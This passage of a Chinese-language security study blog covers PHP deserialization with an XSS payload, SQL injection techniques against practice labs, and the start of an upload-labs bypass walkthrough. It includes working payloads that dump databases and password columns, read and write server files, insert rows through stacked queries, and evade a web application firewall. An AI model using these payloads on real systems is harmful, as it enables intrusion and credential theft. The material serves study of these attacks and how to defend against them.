<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$u=unserialize(&quot;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;&quot;);</span><br><span class="line"> echo $u-&gt;test; //得到的结果为pikachu</span><br></pre></td></tr></table></figure>

<p>这两个函数本身没有问题，但是如果后台不正当地使用了PHP中的魔法函数，将会导致安全问题。</p>
<p>即通过控制对象的属性从而实现控制程序的执行流程，进而达成利用本身无害的代码进行有害操作的目的。</p>
<h4 id="常见的几个魔法函数"><a href="#常见的几个魔法函数" class="headerlink" title="常见的几个魔法函数:"></a>常见的几个魔法函数:</h4><blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;__construct()  // 创建对象时触发</span><br><span class="line">&gt;__sleep()   // 使用 serialize 时触发</span><br><span class="line">&gt;__wakeup()  // 使用 unserialize 时触发</span><br><span class="line">&gt;__destruct()   // 对象被销毁时触发</span><br><span class="line">&gt;__call()   // 在对象上下文中调用不可访问的方法时触发</span><br><span class="line">&gt;__callStatic()   // 在静态上下文中调用不可访问的方法时触发</span><br><span class="line">&gt;__get()   // 用于从不可访问的属性读取数据</span><br><span class="line">&gt;__set()   // 用于将数据写入不可访问的属性</span><br><span class="line">&gt;__isset()   // 在不可访问的属性上调用 isset() 或 empty() 触发</span><br><span class="line">&gt;__unset()   // 在不可访问的属性上使用 unset() 时触发</span><br><span class="line">&gt;__toString()   // 把类当作字符串使用时触发</span><br><span class="line">&gt;__invoke()   // 当脚本尝试将对象调用为函数时触发</span><br><span class="line">&gt;————————————————</span><br><span class="line">&gt;版权声明：本文为CSDN博主「imz丶」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">&gt;原文链接：https://blog.csdn.net/yang1234567898/article/details/122147828</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="演示："><a href="#演示：" class="headerlink" title="演示："></a>演示：</h3><p>源代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">            <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!@<span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;<span class="subst">&#123;$unser-&gt;test&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该代码逻辑为，你的<strong>输入</strong>需要是一个<strong>序列化的结果</strong>；</p>
<p>代码尝试将反序列化后的对象<strong>赋值</strong>给变量 <code>$unser</code>。如果<strong>反序列化成功</strong>，即 <code>$s</code> 是一个有效的序列化字符串并可以还原为对象，那么变量 <code>$unser</code> 将不为 <code>false</code>，条件 <code>if(!@$unser = unserialize($s))</code> 将为假，执行else中的语句，可以用xss啊之类的有害语句。</p>
<p>写个代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class S&#123;</span><br><span class="line">        public $test=&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $s=new S(); //创建一个对象</span><br><span class="line">    echo serialize($s); //把这个对象进行序列化</span><br><span class="line">echo &quot;123&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>构造一下：O:1:”S”:1:{s:4:”test”;s:6:”test12”;}，会输出test12</p>
<p>那构造xss攻击</p>
<p><code>O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;&#125;</code></p>
<p>也可以执行其他攻击，如	文件包含、命令执行等。</p>
<h3 id="防御方法："><a href="#防御方法：" class="headerlink" title="防御方法："></a><strong>防御方法：</strong></h3><p>严格控制用户输入</p>
<p>对传入的反序列化参数进行严格过滤</p>
<h2 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h2><p>以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。</p>
<p>本章提供的案例中,为了模拟漏洞,通过手动指定LIBXML_NOENT选项开启了xml外部实体解析。</p>
]]></content>
      <categories>
        <category>web漏洞</category>
        <category>pikachu</category>
      </categories>
      <tags>
        <tag>xss</tag>
        <tag>php反序列化</tag>
        <tag>xxe</tag>
        <tag>csrf/ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入总述</title>
    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E8%BF%B0/</url>
    <content><![CDATA[<h1 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>攻击者通过把<strong>恶意SQL命令插入</strong>到Web表单的输入域或页面请求的查询字符串中，并且插入的恶意SQL命令会<strong>导致原有SQL语句作用发生改变</strong>，从而达到<strong>欺骗服务器执行恶意的SQL命令</strong>的一种攻击方式。</p>
<h3 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h3><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230524231210348.png" alt="image-20230524231210348"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230522161221724.png" alt="image-20230522161221724"></p>
<p>答案是bc，a错在注入点在y上了；d与问题无关</p>
<p><strong>总结</strong>：注入点是谁，就要将语句写在其后面</p>
<h2 id="a-Mysql结构"><a href="#a-Mysql结构" class="headerlink" title="a)Mysql结构"></a>a)Mysql结构</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230522163119227.png" alt="image-20230522163119227"></p>
<p>Mysql数据库</p>
<p>数据库A&#x3D;网站A&#x3D;数据库用户A</p>
<p>​		表名</p>
<p>​				列名</p>
<p>​						数据</p>
<p>数据库B&#x3D;网站B&#x3D;数据库用户B</p>
<p>​		…</p>
<p>如上，一个站一个数据库用户，即使A站有漏洞，不影响B站使用，但是嘞，如果是root用户高权限可以跨库了。</p>
<p>相关知识点：</p>
<p>1.为了得到数据，需要库-&gt;表-&gt;列</p>
<p>2.所谓的数据库高低版本，即在Mysql库5.0及以上版本中，存在information_schema库，它记录了所有数据库名，表名，列名。</p>
<p>3.数据库中的”.”代表下一级，如admin.user，即admin库下的user表</p>
<p>4.information_schema.tables&#x2F;columns；记录的所有表名&#x2F;列名信息</p>
<p>​	table_schema库名；	</p>
<p>​	table_name表名;</p>
<p>​	column_name()列名；</p>
<p>这些知识点，在sql-labs实践时得到体现。</p>
<h3 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h3><p>老办法：id&#x3D;1 and 1&#x3D;1页面正常 与id&#x3D;1 and 1&#x3D;2页面错误</p>
<p>快方法：id&#x3D;1asdsad，页面错误，就加上其它的字符，对页面有影响</p>
<p>注意：404错误和500跳转的话，那就是特殊情况咯</p>
<h3 id="简单注入之联合查询"><a href="#简单注入之联合查询" class="headerlink" title="简单注入之联合查询"></a>简单注入之联合查询</h3><h4 id="猜解准备"><a href="#猜解准备" class="headerlink" title="猜解准备"></a>猜解准备</h4><ol>
<li>猜解列名数量(字段数) order by x 页面正常否</li>
<li>id &#x3D;-1 union select 1,2,…,x  id&#x3D;-1查询不存在后，才会回显后面的1,2,3…x位置</li>
</ol>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>将数字替换成version()、database()、user()、@@version_compile_os()…</p>
<h3 id="高权限下的跨库查询（即指定x库x表下的数据）"><a href="#高权限下的跨库查询（即指定x库x表下的数据）" class="headerlink" title="高权限下的跨库查询（即指定x库x表下的数据）"></a>高权限下的跨库查询（即指定x库x表下的数据）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库 //爆库</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表	 //爆表</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列							//爆列</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段					 //爆字段</span><br></pre></td></tr></table></figure>

<p>group_concat是多个拼接显示；或者可用limt x,1变动猜解</p>
<h3 id="文件读写操作"><a href="#文件读写操作" class="headerlink" title="文件读写操作"></a>文件读写操作</h3><h4 id="路径获取常见方法："><a href="#路径获取常见方法：" class="headerlink" title="路径获取常见方法："></a>路径获取常见方法：</h4><p>load_file()：读取函数</p>
<p>into outfile或into dumpfile：导出函数</p>
<p><code>select load_file(&#39;d:/test/1.txt&#39;)</code></p>
<p><code>select &#39;x&#39; into outfile &#39;d:/www.txt&#39;;</code>（需要配置file权限）</p>
<p>即Mysql下的my.ini文件中加入secure_file_priv&#x3D;’’，重启mysql即可</p>
<p><code>?id=-1%20union%20select%201,load_file(%27D:\\phpstudy_pro\\WWW\\sqli\\1.txt%27),3</code>  <strong>读取文件</strong></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230522185816516.png" alt="image-20230522185816516"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230522190256745.png" alt="image-20230522190256745"></p>
<p><code>?id=-1%20union%20select%201,%27x%27,3%20into%20outfile%20%20%27D:\\phpstudy_pro\\WWW\\sqli\\2.txt%27 --+</code><strong>写入文件</strong>；–+是注释掉后面的LIMIT</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230522191240332.png" alt="image-20230522191240332"></p>
<h4 id="路径获取常见方法：-1"><a href="#路径获取常见方法：-1" class="headerlink" title="路径获取常见方法："></a>路径获取常见方法：</h4><p>报错显示；</p>
<p>遗留文件；(phpinfo.php啥的)</p>
<p>漏洞报错；</p>
<p>平台配置文件；（什么.ini之类的）</p>
<p>爆破等；</p>
<h4 id="常见读取文件列表："><a href="#常见读取文件列表：" class="headerlink" title="常见读取文件列表："></a>常见读取文件列表：</h4><h3 id="防注入相关"><a href="#防注入相关" class="headerlink" title="防注入相关"></a>防注入相关</h3><h4 id="魔术引号开关："><a href="#魔术引号开关：" class="headerlink" title="魔术引号开关："></a>魔术引号开关：</h4><p>magic_quotes_gpc&#x3D;off</p>
<p>当它为On时，输入数据中的引号、反斜线、NULL均被加上反斜线，效果同addslashes()</p>
<p>所以就用编码或宽字节绕过了。</p>
<p>编码之后，括号里就不用单引号了。即load_file(<strong>‘路径’</strong>)变为load_file(编码)即可</p>
<h4 id="内置函数-int"><a href="#内置函数-int" class="headerlink" title="内置函数:int"></a>内置函数:int</h4><p>是指，对输入变量进行类型判断，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (is_int($var_name1)) </span><br><span class="line">&#123;    </span><br><span class="line">拼接sql语句，执行sql语句</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">报错啥的</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种就别想着绕过了吧。所以强类型语言其实很少有sql注入？</p>
<h4 id="自定义关键字-select"><a href="#自定义关键字-select" class="headerlink" title="自定义关键字:select"></a>自定义关键字:select</h4><p>是指，比如str_replace()，替换输入中的select，所以一般大小写绕过或双写</p>
<h2 id="b-类型及提交注入"><a href="#b-类型及提交注入" class="headerlink" title="b)类型及提交注入"></a>b)类型及提交注入</h2><h3 id="前景引入"><a href="#前景引入" class="headerlink" title="前景引入"></a>前景引入</h3><p>id&#x3D;1; 数字型</p>
<p>name&#x3D;’zifu’ 字符型</p>
<p>例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$name=$_GET[&#x27;x&#x27;]</span><br><span class="line">$sql=&quot;select * from user where name=&#x27;$name&#x27;&quot;;</span><br></pre></td></tr></table></figure>

<p>此时，?x&#x3D;yuleiyun and 1&#x3D;1</p>
<p>会出现select … name&#x3D;<strong>‘yuleiyun and 1&#x3D;1’</strong></p>
<p>故引出了闭合条件。（也是一种参数类型，即非数字型注入，都需要闭合）</p>
<h3 id="明确参数类型"><a href="#明确参数类型" class="headerlink" title="明确参数类型"></a>明确参数类型</h3><p>数字；</p>
<p>字符；</p>
<p>搜索；（like 模糊查询 name&#x3D;’%ring%’）</p>
<p>Json；</p>
<p>…</p>
<h3 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h3><p>get;（url）</p>
<p>post;</p>
<p>cookie;</p>
<p>http代理;</p>
<p>referer;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$get =$_GET[&#x27;a&#x27;];//参数a为get请求方式，以url提交</span><br><span class="line">echo $get;</span><br><span class="line">$post=$_POST[&#x27;b&#x27;];//参数b为post请求方式，bp上提交</span><br><span class="line">echo $post;</span><br><span class="line">$c=$_COOKIE[&#x27;c&#x27;];//参数c为cookie请求方式(其实COOKIE是可以接收到GET请求或POST请求的啊，以后的COOKIE注入)，bp上提交</span><br><span class="line">echo $c;</span><br><span class="line">$r=$_REQUEST[&#x27;r&#x27;];//参数r为request请求方式（REQUEST可以接收GET或POST）</span><br><span class="line">echo $r;</span><br><span class="line">$s=$_SERVER[&#x27;HTTP_USER_AGENT&#x27;];//具体见$_SERVER详解</span><br><span class="line">echo $s;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>具体体现为:url中….?a&#x3D;123&amp;b&#x3D;345，页面只会显示123</p>
<p>而要显示参数b，需要进行post请求，即在bp中，体现为，在请求体中输入b&#x3D;345;</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523122704138.png" alt="image-20230523122704138"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523125650035.png" alt="image-20230523125650035"></p>
<p>手动更改方框处的GET变为POST不会有变化，需要右键<strong>change request method</strong>才可以，注意get请求下的参数要显示，需要在url位置上搭配**?**，即使在post下也会显示。</p>
<p>嫌麻烦的话，针对post请求，<strong>hackbar工具</strong>也有同样效果</p>
<p>sqli-labs:</p>
<p>less 5,6(字符型注入);</p>
<p>less 11(post提交);</p>
<p>less 20(cookie注入);</p>
<p>less 18(http头部注入);</p>
<h3 id="json注入"><a href="#json注入" class="headerlink" title="json注入"></a>json注入</h3><p>JSON 是存储和交换文本信息的语法，是轻量级的文本数据交换格式。类似xml，但JSON 比 XML 更小、更快，更易解析。所以现在接口数据传输都采用json方式进行。JSON 文本的 MIME 类型是 “application&#x2F;json”。</p>
<p>json格式为，post中，输入json&#x3D;{“usename”:”admin”}</p>
<h2 id="c-查询方式及报错盲注"><a href="#c-查询方式及报错盲注" class="headerlink" title="c)查询方式及报错盲注"></a>c)查询方式及报错盲注</h2><h3 id="查询方式："><a href="#查询方式：" class="headerlink" title="查询方式："></a>查询方式：</h3><h4 id="select-查询"><a href="#select-查询" class="headerlink" title="select 查询"></a>select 查询</h4><p><code>select * from users where id=$id; </code></p>
<p>显示数据</p>
<h4 id="insert-添加"><a href="#insert-添加" class="headerlink" title="insert 添加"></a>insert 添加</h4><p><code>insert into users(a,b,c) values(1,&#39;x&#39;,3); </code></p>
<p>用户注册添加时</p>
<h4 id="delete-删除"><a href="#delete-删除" class="headerlink" title="delete 删除"></a>delete 删除</h4><p><code>delete from users where id=$id; </code></p>
<p>后台管理，删除文章或用户等操作</p>
<h4 id="update-更新"><a href="#update-更新" class="headerlink" title="update 更新"></a>update 更新</h4><p><code>update user set pwd=&#39;pd&#39;  where id=1 and username=&#39;admin&#39;; </code></p>
<p>同步或缓存操作</p>
<h4 id="order-by-排序"><a href="#order-by-排序" class="headerlink" title="order by 排序"></a>order by 排序</h4><h4 id="查询总结："><a href="#查询总结：" class="headerlink" title="查询总结："></a>查询总结：</h4><p>根据不同查询方式和网站应用关系去猜解注入</p>
<h3 id="报错盲注："><a href="#报错盲注：" class="headerlink" title="报错盲注："></a>报错盲注：</h3><h4 id="使用场景："><a href="#使用场景：" class="headerlink" title="使用场景："></a>使用场景：</h4><p>当注入时，获取的数据不回显在前端时，进行报错盲注</p>
<h4 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h4><h5 id="布尔盲注："><a href="#布尔盲注：" class="headerlink" title="布尔盲注："></a>布尔盲注：</h5><blockquote>
<p>regexp;</p>
<p>substr;</p>
<p>like;</p>
<p>like ‘wh%’</p>
<p>ord&#x2F;ascii;</p>
<p>ascii(x)&#x3D;97 x的ascii码是否是97</p>
<p>left;</p>
<p>left(a,b)从左侧截取a的前b位</p>
<p>例如：database()&#x3D;’security’  ;</p>
<p><strong>left(database(),3)&#x3D;’sec’;</strong></p>
<p>mid;</p>
<p>mid(a,b,c) 从位置b开始，截取字符串a的c长度的子串</p>
</blockquote>
<p>长度-&gt;字符这样爆破，诶。</p>
<h5 id="时间-延时-盲注："><a href="#时间-延时-盲注：" class="headerlink" title="时间(延时)盲注："></a>时间(延时)盲注：</h5><blockquote>
<p>if;</p>
<p>if(a&lt;4,”小”,”大”)；如果a的值满足&lt;4嘞，返回”小”；否则返回”大”</p>
<p>sleep;</p>
<p>sleep(if(length(database()&lt;8),5,0))</p>
<p>…</p>
</blockquote>
<p>盲注一般写脚本、sqlmap做</p>
<h5 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h5><blockquote>
<p>无回显内容时，可以强制报错回显。</p>
<p>常见的有：</p>
<p>floor;</p>
<p>updatexml;</p>
<p>extractvalue;</p>
</blockquote>
<h5 id="使用优先度："><a href="#使用优先度：" class="headerlink" title="使用优先度："></a>使用优先度：</h5><p><strong>联合&gt;报错&gt;布尔&gt;时间</strong></p>
<h3 id="注入技巧"><a href="#注入技巧" class="headerlink" title="注入技巧"></a>注入技巧</h3><p>类型判断+回显情况</p>
<h2 id="d-二次、加解密、DNSlog注入等"><a href="#d-二次、加解密、DNSlog注入等" class="headerlink" title="d)二次、加解密、DNSlog注入等"></a>d)二次、加解密、DNSlog注入等</h2><h3 id="加解密注入"><a href="#加解密注入" class="headerlink" title="加解密注入"></a>加解密注入</h3><p>一般比如，将数据进行了加密，需要弄清楚它所采用的加密解密算法，做注入时，将输入数据同样加密后再提交</p>
<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>适用场景：已知代码的情况下，构造</p>
<p>经典例子就是，注册时，允许注册admin’#这种账号，登陆进去修改admin’#的密码时其实是修改了admin（如果有的话）的密码。等于说你已知管理员账号，但不知道密码，你又可以注册又可以改密码，这种情况。</p>
<h3 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h3><p>适用场景：需要有文件读取的操作权限，解决盲注不回显数据的问题。</p>
<p>利用concat将select查询的结果与一个dnslog地址进行拼接，形成一个能够访问的域名；接着用load_file()导入或请求这个地址，在dnslog中就会有记录。</p>
<p>可以用平台，可以用github上的dnslog.py脚本</p>
<h3 id="中转注入"><a href="#中转注入" class="headerlink" title="中转注入"></a>中转注入</h3><p>适用场景：为了避免遇到加解密注入时，自己进行加密注入。以base64为例，自己写个php文件，获取该网站url，利用base64_encode函数对输入的参数x进行加密。</p>
<p>sqlmap提供爆破参数，传递给php，php尝试获取内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url=&#x27;http://dasdadaawfwfaf/asd.asp?id=&#x27;;</span><br><span class="line">$payload=base64_encode($_GET[&#x27;x&#x27;]);</span><br><span class="line">$urls=$url.$payload;</span><br><span class="line">file_get_contents(); //在php中，字符串拼接是&quot;.&quot; //有的说，换成header()</span><br><span class="line">//echo $urls;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以该php代码放到本地环境中,如phpstudy&#x2F;www&#x2F;1.php</p>
<p>sqlmap就可以:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost:8080/1.php?x=&quot; - v 3</span><br></pre></td></tr></table></figure>

<p>sqli-labs:</p>
<p>less 21 cookie&amp;加解密注入</p>
<p>less24 post登陆框&amp;二次注入</p>
<p>less 9 load_file&amp;dnslog带外注入</p>
<h2 id="e-堆叠注入及WAF绕过"><a href="#e-堆叠注入及WAF绕过" class="headerlink" title="e)堆叠注入及WAF绕过"></a>e)堆叠注入及WAF绕过</h2><h3 id="堆叠查询"><a href="#堆叠查询" class="headerlink" title="堆叠查询"></a>堆叠查询</h3><p>（stacked injection），注入语句时，可以有多个语句。</p>
<p>局限性：受到API和数据库的限制</p>
<p><code>?id=1;insert into users(id,username,password) values(1,2,3) --+</code></p>
<p>适用场景举例：注入需要管理员账号密码，密码是加密的，无法解密；那么堆叠注入进行插入数据，由于用户和密码是自定义的，所以可以正常解密登录</p>
<p>sqli-labs:</p>
<p>less 38 堆叠注入</p>
<h3 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h3><blockquote>
<p>WAF绕过<br>数据<br>    大小写<br>    加解密<br>    编码解码<br>    等价函数<br>    特殊符号<br>    反序列化<br>    注释符混用<br>方式<br>    提交方式更改<br>    变异<br>其他<br>    Fuzz&#x2F;模糊测试<br>    数据库特性<br>    垃圾数据溢出<br>    HTTP参数污染</p>
</blockquote>
<p>补充：内联注释绕过：MYSQL数据库特性 &#x2F;*!需要查询的数据*&#x2F;</p>
<h4 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h4><p><img src="/../../../Typora/img111/image-20230524224452252.png" alt="image-20230524224452252"></p>
<p>即有多个相同参数时，以哪个位置的参数为主。</p>
<p>以php为例：</p>
<blockquote>
<?php

​     \$get=  $_GET['x'];

echo $get

?>

<p>输入参数为….?x&#x3D;12&amp;x&#x3D;7时</p>
<p>结果显示为7</p>
</blockquote>
<p><strong>宝塔WAF搭建部署。</strong></p>
<p>绕过举例：如果拦截了<strong>database()<strong>这个函数，可以用</strong>database&#x2F;</strong>&#x2F;()**；</p>
<p>2021的安全狗联合绕过1：</p>
<p><code>?id=-1 union%23a%0Aselect 1,2,3#</code></p>
<blockquote>
<p>%23a%0Ax相当于#a换行符</p>
<p>相当于：换行执行</p>
<p>union #a</p>
<p>select 1,2,3#</p>
</blockquote>
<p>安全狗绕过2：</p>
<p>php+apache下：</p>
<p><code>?id=1/**&amp;id=-1 union select 1,2,3#*/</code></p>
<p>原理相当于：&#x2F;**…*&#x2F;起注释作用，安全狗获得整段数据，匹配的是<code>1/**&amp;id=-1 union select 1,2,3#*/</code>，识别到后面是注释符时，正常情况下不执行，安全狗直接不管，但参数污染导致接收的是真实数据是<code>-1 union select 1,2,3#*/</code></p>
<p>一般都是脚本试出来的。</p>
<p>像这种绕过，一般要去论坛上找最新的了。</p>
<h2 id="f-sqlmap绕过waf"><a href="#f-sqlmap绕过waf" class="headerlink" title="f)sqlmap绕过waf"></a>f)sqlmap绕过waf</h2><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1><h1 id="-2"><a href="#-2" class="headerlink" title=""></a></h1>]]></content>
      <categories>
        <category>web漏洞</category>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>waf绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入之联合注入</title>
    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="联合注入的定义、过程，及效果"><a href="#联合注入的定义、过程，及效果" class="headerlink" title="联合注入的定义、过程，及效果"></a>联合注入的定义、过程，及效果</h2><p>使用联合查询进行注入的一种方式，是一种高效的注入的方式，适用于有回显同时数据库软件版本是5.0以上的MYSQL数据库。至于为什么需要版本是5.0以上的MYSQL数据库，是因为MYSQL会有一个系统数据库information_schema，能很快的通过几条注入语句获取到想要的数据。</p>
<p>union有一个十分严格的约束条件，因为是联合查询，必选保证字段数一致，即两个查询结果有相同的<strong>列数</strong>，因此我们后面要对字段数进行判断。</p>
<p>mysql中，union用于将多个select语句的结果组合到一个结果集中，并删除结果集中的重复数据。</p>
<p>1、    判断注入点</p>
<p>假如存在这么一个参数?id&#x3D;1，可以在参数后面加个单引号或者双引号看是否爆sql语法的错误</p>
<p>2、    判断<strong>闭合</strong>形式</p>
<p>主要是判断是否是<strong>整形</strong>闭合，还是字符型闭合，如果是字符型闭合 ，又看是否是<strong>单引</strong>号闭合、双引号闭合，或者是<strong>引号加括号</strong>的闭合形式。</p>
<p>3、判断查询列数</p>
<p>1’ order by 1–+</p>
<p>当order by 3时排序第三个栏位回显正常，而order by 4回显错误，可以判断出当前sql语句向该表查询了三个字段。所以说orderby只是判断了当前sql语句查询的字段数，并不是判断Users表中有几个列，目的是为了符合union的用法，即有相同的字段数。</p>
<p>4、判断显示位</p>
<p>对于一个网页，如果它的列数有三列，但可能只有1，2列的数据返回页面前端。所以我们需要查询哪个列会回显，得用unionselect 1,2,3来查看回显位。</p>
<p>常用语句为-1’ union select 1,2,3–+</p>
<p>这里一定得是-1 union……，而不是1 union…..因为程序在展示数据的时候通常只会取结果集的第一行数据，mysql_fetch_array只被调用了一次，而mysql_fetch_array从结果集中取得一行作为关联数组或数字数组或二者兼有，具体看第二个参数是什么。所以这里无论怎么折腾最后只会出来第一行的查询结果。</p>
<p>只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了</p>
<p>5、获取所有数据库名</p>
<p>6、获取数据库所有表名</p>
<p>7、获取字段名 </p>
<p>8、获取字段中的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库 //爆库</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表	 //爆表</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列							//爆列</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段					 //爆字段</span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://blog.csdn.net/qq_61237064/article/details/121758528?ops_request_misc=%7B%22request_id%22:%22168049213216800211546816%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168049213216800211546816&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-121758528-null-null.142%5Ev80%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187">sql注入中的联合注入_ZredamanJ的博客-CSDN博客</a></p>
]]></content>
      <categories>
        <category>web漏洞</category>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>联合注入</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs</title>
    <url>/2023/05/20/upload-labs/</url>
    <content><![CDATA[<h1 id="1-12部分"><a href="#1-12部分" class="headerlink" title="1-12部分"></a>1-12部分</h1><h2 id="Pass-1-白名单后缀绕过"><a href="#Pass-1-白名单后缀绕过" class="headerlink" title="Pass 1(白名单后缀绕过)"></a>Pass 1(白名单后缀绕过)</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>1.关闭浏览器的js。</p>
<p>2.上传符合要求的文件，再bp改名为php</p>
